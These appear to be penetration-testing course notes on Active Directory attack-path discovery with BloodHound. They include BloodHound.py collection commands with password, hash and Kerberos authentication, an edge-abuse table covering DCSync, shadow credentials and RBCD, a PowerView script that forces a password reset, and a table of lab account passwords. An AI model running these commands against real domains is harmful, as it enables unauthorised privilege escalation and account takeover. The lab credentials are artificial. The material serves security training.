-c, --collectionmethodCollection method(s): Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, All
-d, --domainTarget domain
-u, --usernameUsername (format: user@domain)
-p, --passwordPassword
-k, --kerberosUse Kerberos authentication
--hashesLM:NTLM hashes
-no-passDon't ask for password (use with -k)
-aesKeyAES key for Kerberos (128 or 256 bits)
--auth-methodForce authentication method: auto, ntlm, kerberos
-ns, --nameserverAlternative DNS nameserver
--dns-tcpUse TCP for DNS queries
-dc, --domain-controllerOverride DC hostname
-gc, --global-catalogOverride global catalog hostname
-w, --workersWorkers for computer enumeration (default: 10)
--exclude-dcsSkip DCs during computer enumeration
--zipCompress output into zip archive
--computerfileAllowlist of computer FQDNs for computer-based methods

3.4.3 Running BloodHound.py

# DCOnly with NTLM fallback (Kerberos fails if DNS not configured)
bloodhound-python -d [domain] -c DCOnly -u [user] -p '[password]' \
  -ns [target-ip] -k

# Add hosts file entry to enable Kerberos
echo -e "\n[target-ip] [dc].[domain] [dc] [domain] [domain]" \
  | sudo tee -a /etc/hosts

# With Kerberos authentication (stealthier - matches normal Windows traffic)
bloodhound-python -d [domain] -c DCOnly -u [user] -p '[password]' \
  -ns [target-ip] --kerberos

# List output files produced
ls
# 20230112171634_computers.json  20230112171634_domains.json
# 20230112171634_containers.json 20230112171634_gpos.json
# 20230112171634_groups.json     20230112171634_ous.json
# 20230112171634_users.json
Note: The --nameserver flag handles DNS for LDAP but not Kerberos. For Kerberos auth, the DC FQDN must resolve via /etc/hosts or system DNS.

Methodology

  • Add DC to /etc/hosts for Kerberos resolution: 
    echo "10.129.X.X [dc].domain.htb [dc] [domain] domain.htb" | sudo tee -a /etc/hosts
  • Run BloodHound.py with Kerberos auth (preferred): 
    bloodhound-python -d <DOMAIN> -c DCOnly -u <USER> -p '<PASS>' -ns <DC_IP> --kerberos
  • Run with NTLM fallback (when Kerberos unavailable): 
    bloodhound-python -d <DOMAIN> -c All -u <USER> -p '<PASS>' -ns <DC_IP> --auth-method ntlm --zip
  • Run with hash authentication: 
    bloodhound-python -d <DOMAIN> -c DCOnly -u <USER> --hashes <LM:NT> -ns <DC_IP>

3.5 Navigating the BloodHound GUI

Once data is imported, BloodHound displays a Graph Drawing Area showing nodes and edges. On login, it runs the "Find all Domain Admins" query automatically.

3.5.1 Node Right-Click Actions

Mark/Unmark as High ValueTag node as a high-value target for path queries
Delete NodeRemove the node from the Neo4j database

Use node_type:search_term syntax to filter searches. Supported AD node type prefixes:

3.5.6 Pathfinding Example

To find a path from ryan to Domain Admins, enter both nodes in the pathfinding bar. To exclude an edge like ForceChangePassword, use the filter option and uncheck it before searching.

3.7 BloodHound Edges

Edges represent relationships and privileges between nodes. Right-clicking an edge in BloodHound shows an Abuse Info tab with exploitation steps and opsec considerations.

3.7.1 Complete Edge List (AD)

EdgeAbuse Summary
AdminToLocal admin access on target computer
MemberOfGroup membership (inherits group privileges)
HasSessionActive user session on a computer
ForceChangePasswordReset target's password without knowing current one
AddMembersAdd users to the target group
AddSelfAdd yourself to the target group
CanRDPRDP access to target computer
CanPSRemotePowerShell Remoting access to target
ExecuteDCOMDCOM execution on target
SQLAdminSQL admin rights on target
AllowedToDelegateConstrained delegation to target service
DCSyncReplicate domain credentials (DCSync attack)
GetChanges / GetChangesAllReplication rights required for DCSync
GenericAllFull control over object
WriteDaclModify DACL - grant arbitrary permissions
GenericWriteWrite non-protected attributes (e.g., scriptPath, SPN)
WriteOwnerChange object ownership
WriteSPNAdd/modify SPN - enables targeted Kerberoasting
OwnsObject ownership rights
AddKeyCredentialLinkModify msDS-KeyCredentialLink - shadow credentials
ReadLAPSPasswordRead LAPS-managed local admin password
ReadGMSAPasswordRead GMSA managed password
ContainsContainer/OU contains this object
AllExtendedRightsBundle of extended AD rights (includes ForceChangePassword)
GPLinkGPO linked to OU/domain/site
AllowedToActResource-based constrained delegation (RBCD)
AddAllowedToActModify msDS-AllowedToActOnBehalfOfOtherIdentity
TrustedByDomain trust relationship
SyncLAPSPasswordSync LAPS passwords
HasSIDHistorySID History attribute - can grant cross-domain privileges
WriteAccountRestrictionsWrite account restriction attributes

3.7.2 Abusing ForceChangePassword Edge (Example)

# Import PowerView
Set-ExecutionPolicy Bypass -Force
Import-Module C:\tools\PowerView.ps1

# Create credential object for the attacker account (grace)
$SecPassword = ConvertTo-SecureString 'Password11' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[user]', $SecPassword)

# Set new password for target account (rosy)
$UserPassword = ConvertTo-SecureString 'NewRossyCreds!' -AsPlainText -Force
Set-DomainUserPassword -Identity rosy -AccountPassword $UserPassword -Credential $Cred -Verbose

Playground Credential Reference

gracePassword11ForceChangePasswordrosy
rosyPassword99CanRDP, CanPSRemote, ExecuteDCOM[host]
sarahPassword12AdminTo[host]
marthaPassword13AddMembersITManagers

peterLicey2023DCSyncINLANEFREIGHT

nicolePassword21GenericWritealbert
sarahPassword12AddKeyCredentialLinkindhi
elieserPassword22Owns (User)nicole
danielaPassword23AddKeyCredentialLink[host]
[user][password]ReadLAPSPassword, ReadGMSAPasswordLAPS01, svc_devadm
elizabethPassword26AllExtendedRights (User)elieser
gilPassword28AddAllowedToAct[dc]
svc_backupsBackingUpSecure1WriteDacl/WriteOwner/GenericWriteBACKUPS (GPO)

Methodology

  • Identify all edges on a target node (click node → Inbound Control Rights → Explicit / Transitive)
  • Right-click any edge → Help → Abuse Info to read exploitation steps
  • Exploit ForceChangePassword via PowerView: 
    Import-Module C:\tools\PowerView.ps1
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\attacker', (ConvertTo-SecureString 'Pass' -AsPlainText -Force))
$NewPass = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity target -AccountPassword $NewPass -Credential $Cred -Verbose
  • After exploiting an edge, mark the new node as Owned to find next steps

3.8 Analyzing BloodHound Data

3.8.1 Domain Overview

# In BloodHound search bar - search the domain node
domain:INLANEFREIGHT.HTB

This shows domain functional level, user/group/computer/OU/GPO counts, and the OU structure via "Map OU Structure".

3.8.2 Pre-Built Analytic Queries

QueryPurpose
Find all Domain AdminsList all direct and unrolled DA members
Find Shortest Paths to Domain AdminsMost critical attack path query
Find Principals with DCSync RightsAccounts that can perform DCSync
Users with Foreign Domain Group MembershipCross-trust attack opportunities
Groups with Foreign Domain Group MembershipCross-trust attack opportunities via groups
Map Domain TrustsAll trust relationships
